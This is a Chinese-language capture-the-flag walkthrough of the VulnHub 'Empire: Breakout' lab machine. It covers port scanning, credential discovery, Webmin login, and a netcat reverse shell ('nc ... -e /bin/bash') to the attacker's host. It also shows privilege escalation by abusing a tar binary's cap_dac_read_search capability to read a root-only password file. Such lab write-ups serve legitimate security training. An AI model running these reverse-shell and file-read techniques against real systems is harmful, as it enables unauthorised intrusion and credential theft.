---
title: Breakout
date: 2026-05-04
categories:
  - 靶机
  - vulnhub
tags:
---

# Breakout

靶机链接：https://www.vulnhub.com/entry/empire-breakout,751/

## 1. 信息收集

### 1.1 主机发现

```bash
arp-scan -l
# 192.168.3.71
```

### 1.2 端口扫描

```bash
nmap -p- -sV -O 192.168.3.71
```

| 端口 | 服务 | 版本 |
|------|------|------|
| 80 | HTTP | Apache httpd 2.4.51 (Debian) |
| 139/445 | Samba | smbd 4 |
| 10000 | HTTP | MiniServ 1.981 (Webmin) |
| 20000 | HTTP | MiniServ 1.830 (Webmin) |

### 1.3 源码审计

访问 80 端口，查看网页源代码，发现一段 Brainfuck 编码，解码后得到密码：

![](assets/file-20260504232439418.png)

```
.2uqPEfj3D<P'a-3
```

### 1.4 Samba 枚举

> **enum4linux** 是一款基于 Perl 的 SMB/RPC 信息收集脚本，底层封装了 smbclient、rpcclient、nmblookup、net 等工具，用于批量枚举 Windows/Samba 主机的用户、共享、组、密码策略等信息。

```bash
enum4linux -a 192.168.3.71
```

关键输出：

```
S-1-22-1-1000 Unix User\cyber (Local User)  ← 用户名
```

## 2. 获取初始 Shell

### 2.1 Webmin 登录

使用用户名 `cyber` + 解码得到的密码 `.2uqPEfj3D<P'a-3`，成功登录 20000 端口的 Webmin。

![](assets/file-20260504234711652.png)

### 2.2 反弹 Shell

Webmin 左下角有 Shell 图标，点击进入，即可查看 user.txt：

![](assets/file-20260504234921413.png)

然后执行反弹 Shell：

```bash
# Kali 攻击机监听
nc -lvnp 1111

# 目标机执行
nc 192.168.3.72 1111 -e /bin/bash
```

### 2.3 升级为交互式 Shell

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

拿到 user.txt：

```
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```

## 3. 提权

### 3.1 信息探测

查看 home 目录，发现一个 `tar` 可执行文件。检查其 Capability：

> **Linux Capabilities** 将 root 的超级权限拆分为细粒度特权。`getcap` 用于查看二进制文件被授予了哪些特权，拥有对应 capability 的进程无需 root 即可执行特权操作。

```bash
cyber@breakout:~$ ls
tar  user.txt
cyber@breakout:~$ getcap tar
tar cap_dac_read_search=ep
```

`cap_dac_read_search=ep` 允许该程序**绕过文件读权限检查**，可以读取系统上任意文件。

### 3.2 读取备份密码

发现 `/var/backups/.old_pass.bak` 仅 root 可读：

```bash
cyber@breakout:/var/backups$ ls -la
-rw-------  1 root root  17 Oct 20  2021 .old_pass.bak
```

利用 tar 的 capability 打包并解压，绕过权限限制：

```bash
./tar -cvf pass.tar /var/backups/.old_pass.bak
./tar -xvf pass.tar
cat var/backups/.old_pass.bak
# Ts&4&YurgtRX(=~h
```

### 3.3 切换到 root

```bash
cyber@breakout:~$ su -
Password: Ts&4&YurgtRX(=~h

root@breakout:~# id
uid=0(root) gid=0(root) groups=0(root)
root@breakout:~# cat rOOt.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
```

## 4. Flag 汇总

| Flag | 内容 |
|------|------|
| user.txt | `3mp!r3{You_Manage_To_Break_To_My_Secure_Access}` |
| root.txt | `3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}` |
